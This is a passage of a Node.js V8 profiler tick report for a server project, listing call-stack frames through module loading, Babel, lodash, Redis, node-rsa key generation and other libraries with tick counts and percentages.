&#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;opentype.js&#x2F;dist&#x2F;opentype.js:11927:21\n      1  100.0%        LazyCompile: ~loadSync &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;opentype.js&#x2F;dist&#x2F;opentype.js:12152:18\n      1  100.0%          Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;svg-captcha&#x2F;lib&#x2F;option-manager.js:1:11\n      1  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1    1.8%      LazyCompile: ~nextTick internal&#x2F;process&#x2F;next_tick.js:96:20\n      1  100.0%        LazyCompile: ~load &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;cache.js:51:14\n      1  100.0%          Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:1:11\n      1  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1    1.8%      LazyCompile: ~json &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;body-parser&#x2F;lib&#x2F;types&#x2F;json.js:50:15\n      1  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;server&#x2F;api&#x2F;apiServer.js:1:11\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~loader &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:143:16\n      1    1.8%      LazyCompile: ~getRawTag &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_getRawTag.js:26:19\n      1  100.0%        LazyCompile: ~baseGetTag &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_baseGetTag.js:19:20\n      1  100.0%          Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_getTag.js:1:11\n      1  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1    1.8%      LazyCompile: ~emit events.js:147:44\n      1  100.0%        LazyCompile: ~RedisClient.on_connect &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;redis&#x2F;index.js:413:45\n      1  100.0%          LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;redis&#x2F;index.js:265:46\n      1  100.0%            LazyCompile: ~onceWrapper events.js:273:21\n      1    1.8%      LazyCompile: ~dataIntersection &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;regenerate&#x2F;regenerate.js:452:33\n      1  100.0%        LazyCompile: ~intersection &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;regenerate&#x2F;regenerate.js:1137:27\n      1  100.0%          Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;regexpu-core&#x2F;rewrite-pattern.js:1:11\n      1  100.0%            LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1    1.8%      LazyCompile: ~configForCategory &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;lib&#x2F;categories.js:89:27\n      1  100.0%        LazyCompile: ~getLevelForCategory &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;lib&#x2F;categories.js:104:29\n      1  100.0%          LazyCompile: ~get level &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;lib&#x2F;logger.js:34:12\n      1  100.0%            LazyCompile: ~Logger &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;lib&#x2F;logger.js:25:14\n      1    1.8%      LazyCompile: ~compile &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:100:17\n      1  100.0%        LazyCompile: ~loader &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:143:16\n      1  100.0%          LazyCompile: ~require.extensions.(anonymous function) &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:150:38\n      1  100.0%            LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1    1.8%      LazyCompile: ~bnpSubTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:402:18\n      1  100.0%        LazyCompile: ~bnModInverse &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1351:22\n      1  100.0%          LazyCompile: ~module.exports.Key.RSAKey.generate &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;rsa.js:93:42\n      1  100.0%            LazyCompile: ~module.exports.NodeRSA.generateKeyPair &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;NodeRSA.js:156:50\n      1    1.8%      LazyCompile: ~asString &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;date-format&#x2F;lib&#x2F;index.js:34:18\n      1  100.0%        LazyCompile: ~DateRollingFileStream &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;streamroller&#x2F;lib&#x2F;DateRollingFileStream.js:15:31\n      1  100.0%          LazyCompile: ~appender &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;lib&#x2F;appenders&#x2F;dateFile.js:16:18\n      1  100.0%            LazyCompile: ~configure &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;log4js&#x2F;lib&#x2F;appenders&#x2F;dateFile.js:42:19\n      1    1.8%      LazyCompile: ~arrayFilter &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:574:23\n      1  100.0%        LazyCompile: ~baseFunctions &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:3020:27\n      1  100.0%          LazyCompile: ~mixin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:15688:19\n      1  100.0%            Script: ~runInContext &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:1406:44\n      1    1.8%      LazyCompile: ~_interopRequireDefault &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;util.js:59:32\n      1  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;util.js:1:11\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1    1.8%      LazyCompile: ~TimeFormat &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;server&#x2F;common&#x2F;index.js:4:36\n      1  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;server&#x2F;api&#x2F;apiServer.js:1:11\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~loader &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:143:16\n      1    1.8%      LazyCompile: ~OptionManager &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;option-manager.js:84:25\n      1  100.0%        LazyCompile: ~compile &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:100:17\n      1  100.0%          LazyCompile: ~loader &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:143:16\n      1  100.0%            LazyCompile: ~require.extensions.(anonymous function) &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:150:38\n      1    1.8%      LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;source-map-support&#x2F;source-map-support.js:377:36\n      1  100.0%        Builtin: ArrayMap\n      1  100.0%          LazyCompile: ~prepareStackTrace &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;source-map-support&#x2F;source-map-support.js:371:27\n      1  100.0%            &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n      1    1.8%      LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:226:25\n      1  100.0%        LazyCompile: ~each &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:134:16\n      1  100.0%          LazyCompile: ~reduce &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:224:18\n      1  100.0%            LazyCompile: ~getProduct &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;platform&#x2F;platform.js:566:24\n      1    1.8%      LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:4903:22\n      1  100.0%        LazyCompile: ~baseForOwn &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:2995:24\n      1  100.0%          Script: ~runInContext &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:1406:44\n      1  100.0%            Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;lodash.js:9:11\n      1    1.8%      LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;modules&#x2F;_collection.js:22:95\n      1  100.0%        LazyCompile: ~module.exports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;modules&#x2F;_fails.js:1:89\n      1  100.0%          LazyCompile: ~module.exports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;modules&#x2F;_collection.js:16:27\n      1  100.0%            Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;core-js&#x2F;library&#x2F;modules&#x2F;es6.map.js:1:11\n      1    1.8%      LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;store.js:23:22\n      1  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;store.js:1:11\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1    1.8%      LazyCompile: *normalizeString path.js:52:25\n      1  100.0%        LazyCompile: ~resolve path.js:1068:28\n      1  100.0%          LazyCompile: ~readPackage internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:153:21\n      1  100.0%            LazyCompile: ~tryPackage internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:174:20\n      1    1.8%      LazyCompile: *montReduce &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:609:20\n      1  100.0%        LazyCompile: ~montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      1  100.0%          LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1  100.0%            LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      1    1.8%      LazyCompile: *bnpSquareTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:448:21\n      1  100.0%        LazyCompile: ~montSqrTo &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:631:19\n      1  100.0%          LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1  100.0%            LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      1    1.8%      LazyCompile: *Module._nodeModulePaths internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:360:37\n      1  100.0%        LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1  100.0%          LazyCompile: ~tryModuleLoad internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:536:23\n      1  100.0%            LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1    1.8%      Eval: ~&lt;anonymous&gt; :1:1\n      1  100.0%        Builtin: CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit\n      1  100.0%          LazyCompile: ~thenCallback &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;join.js:13:32\n      1  100.0%            LazyCompile: ~module.exports &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;bluebird&#x2F;js&#x2F;release&#x2F;join.js:3:9\n      1    1.8%      Builtin: StringPrototypeReplace\n      1  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;lodash&#x2F;_baseIsNative.js:1:11\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1    1.8%      Builtin: RegExpPrototypeTest\n      1  100.0%        LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;connect-redis&#x2F;node_modules&#x2F;debug&#x2F;src&#x2F;node.js:49:64\n      1  100.0%          Builtin: ArrayFilter\n      1  100.0%            Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;connect-redis&#x2F;node_modules&#x2F;debug&#x2F;src&#x2F;node.js:1:11\n      1    1.8%      Builtin: MapPrototypeSet\n      1  100.0%        LazyCompile: *stat internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:84:14\n      1  100.0%          LazyCompile: ~tryFile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:194:17\n      1  100.0%            LazyCompile: ~tryExtensions internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:209:23\n      3    3.3%    LazyCompile: *stat internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:84:14\n      2   66.7%      LazyCompile: ~tryFile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:194:17\n      2  100.0%        LazyCompile: ~tryExtensions internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:209:23\n      2  100.0%          LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      2  100.0%            LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1   33.3%      LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      1  100.0%        LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1  100.0%          LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%            LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n      2    2.2%    LazyCompile: *realpathSync fs.js:1375:22\n      2  100.0%      LazyCompile: ~toRealPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:202:20\n      1   50.0%        LazyCompile: ~tryFile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:194:17\n      1  100.0%          LazyCompile: ~tryExtensions internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:209:23\n      1  100.0%            LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      1   50.0%        LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      1  100.0%          LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1  100.0%            LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1    1.1%    LazyCompile: ~realpathSync fs.js:1375:22\n      1  100.0%      LazyCompile: *tryFile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:194:17\n      1  100.0%        LazyCompile: ~tryExtensions internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:209:23\n      1  100.0%          LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      1  100.0%            LazyCompile: *Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1    1.1%    LazyCompile: ~nullCheck internal&#x2F;fs&#x2F;utils.js:188:19\n      1  100.0%      LazyCompile: ~validatePath internal&#x2F;fs&#x2F;utils.js:442:22\n      1  100.0%        LazyCompile: ~realpathSync fs.js:1375:22\n      1  100.0%          LazyCompile: ~toRealPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:202:20\n      1  100.0%            LazyCompile: ~tryFile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:194:17\n      1    1.1%    LazyCompile: *tryFile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:194:17\n      1  100.0%      LazyCompile: ~tryExtensions internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:209:23\n      1  100.0%        LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      1  100.0%          LazyCompile: *Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%            LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n\n     15    1.4%  &#x2F;usr&#x2F;lib64&#x2F;libpthread-2.17.so\n      3   20.0%    &#x2F;app&#x2F;software&#x2F;nodejs&#x2F;bin&#x2F;node\n      1   33.3%      LazyCompile: ~memoisePluginContainer &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;option-manager.js:92:73\n      1  100.0%        LazyCompile: ~normalisePlugin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;option-manager.js:141:59\n      1  100.0%          LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;option-manager.js:158:33\n      1  100.0%            Builtin: ArrayMap\n      1   33.3%      LazyCompile: ~Module.load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:591:33\n      1  100.0%        LazyCompile: ~tryModuleLoad internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:536:23\n      1  100.0%          LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%            LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n      1   33.3%      LazyCompile: *runInThisContext vm.js:114:19\n      1  100.0%        LazyCompile: ~runInThisContext vm.js:322:26\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n\n     13    1.2%  Builtin: InterpreterEntryTrampoline\n      2   15.4%    LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      2  100.0%      LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1   50.0%        LazyCompile: ~exports.default &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;helpers&#x2F;resolve.js:9:28\n      1  100.0%          LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;helpers&#x2F;resolve-from-possible-names.js:13:40\n      1  100.0%            Builtin: ArrayReduce\n      1   50.0%        LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%          LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n      1  100.0%            LazyCompile: ~require internal&#x2F;modules&#x2F;cjs&#x2F;helpers.js:19:19\n      2   15.4%    Builtin: ArrayMap\n      1   50.0%      Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;psl&#x2F;index.js:1:11\n      1  100.0%        LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%          LazyCompile: ~Module._extensions..js internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:710:37\n      1  100.0%            LazyCompile: ~require.extensions.(anonymous function) &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:150:38\n      1   50.0%      LazyCompile: ~normalisePlugins &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;option-manager.js:157:61\n      1  100.0%        LazyCompile: ~mergeOptions &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;option-manager.js:190:63\n      1  100.0%          LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;option-manager.js:264:52\n      1  100.0%            LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-core&#x2F;lib&#x2F;transformation&#x2F;file&#x2F;options&#x2F;option-manager.js:275:33\n      1    7.7%    LazyCompile: ~join native array.js:280:46\n      1  100.0%      LazyCompile: ~Module._findPath internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:221:28\n      1  100.0%        LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1  100.0%          LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%            LazyCompile: ~Module.require internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:631:36\n      1    7.7%    LazyCompile: ~cloneCallSite &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;source-map-support&#x2F;source-map-support.js:314:23\n      1  100.0%      LazyCompile: ~wrapCallSite &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;source-map-support&#x2F;source-map-support.js:323:22\n      1  100.0%        LazyCompile: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;source-map-support&#x2F;source-map-support.js:377:36\n      1  100.0%          Builtin: ArrayMap\n      1  100.0%            LazyCompile: ~prepareStackTrace &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;source-map-support&#x2F;source-map-support.js:371:27\n      1    7.7%    LazyCompile: ~bnModPow &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1230:18\n      1  100.0%      LazyCompile: ~bnpMillerRabin &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1421:24\n      1  100.0%        LazyCompile: ~bnIsProbablePrime &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:1402:27\n      1  100.0%          LazyCompile: ~bnpFromNumber &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:770:23\n      1  100.0%            LazyCompile: ~BigInteger &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;node-rsa&#x2F;src&#x2F;libs&#x2F;jsbn.js:50:20\n      1    7.7%    LazyCompile: ~Route.(anonymous function) &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;route.js:193:37\n      1  100.0%      LazyCompile: ~proto.(anonymous function) &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:508:27\n      1  100.0%        Script: ~&lt;anonymous&gt; &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;server&#x2F;api&#x2F;frontEnd&#x2F;verify&#x2F;index.js:1:11\n      1  100.0%          LazyCompile: ~Module._compile internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:657:37\n      1  100.0%            LazyCompile: ~loader &#x2F;mnt&#x2F;pgyer&#x2F;nodejs-moddle&#x2F;node_modules&#x2F;babel-register&#x2F;lib&#x2F;node.js:143:16\n      1    7.7%    LazyCompile: ~NativeModule.nonInternalExists internal&#x2F;bootstrap&#x2F;loaders.js:216:46\n      1  100.0%      LazyCompile: ~Module._resolveFilename internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:548:35\n      1  100.0%        LazyCompile: ~Module._load internal&#x2F;modules&#x2F;cjs&#x2F;loader.js:503:24\n      1  100.0%          LazyCompile: ~Module.require 